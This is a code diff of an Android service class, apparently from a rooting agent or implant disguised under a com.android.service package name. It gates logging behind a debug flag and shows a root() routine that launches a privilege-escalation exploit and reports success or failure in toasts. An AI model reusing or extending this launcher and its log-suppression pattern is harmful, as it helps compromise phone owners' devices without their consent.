@@ -12,7 +12,7 @@ import android.os.IBinder;
 import android.util.Log;
 import android.widget.Toast;
 
-import com.android.service.auto.AutoConfig;
+import com.android.service.auto.Cfg;
 import com.android.service.util.Utils;
 
 /**
@@ -32,7 +32,7 @@ public class ServiceCore extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
-		Log.d("QZ", TAG + " (onCreate)");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (onCreate)");
 
 		// Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();
 		Status.setAppContext(getApplicationContext());
@@ -41,7 +41,7 @@ public class ServiceCore extends Service {
 	@Override
 	public void onDestroy() {
 		super.onDestroy();
-		Log.d("QZ", TAG + " (onDestroy)");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (onDestroy)");
 
 		// Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
 		core.Stop();
@@ -72,8 +72,8 @@ public class ServiceCore extends Service {
 
 	private boolean root() {
 		try {
-			if(!AutoConfig.EXP){
-				Log.d("QZ", TAG + " (root): Exploit disabled by conf");
+			if(!Cfg.EXP){
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " (root): Exploit disabled by conf");
 				return false;
 			}
 			String crashlog = "errorlog";
@@ -123,15 +123,15 @@ public class ServiceCore extends Service {
 				r.getProcess().destroy();
 
 			if (isRoot) {
-				Log.d("QZ", TAG + " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
 				Toast.makeText(this, "WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!", Toast.LENGTH_LONG).show();
 			} else {
-				Log.d("QZ", TAG + " (onStart): Fucking third party exploits, they never work!");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " (onStart): Fucking third party exploits, they never work!");
 				Toast.makeText(this, "Fucking third party exploits, they never work!", Toast.LENGTH_LONG).show();
 			}
 		} catch (Exception e1) {
 			e1.printStackTrace();
-			Log.d("QZ", TAG + " (root): Exception on root()");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (root): Exception on root()");
 			return false;
 		}
 
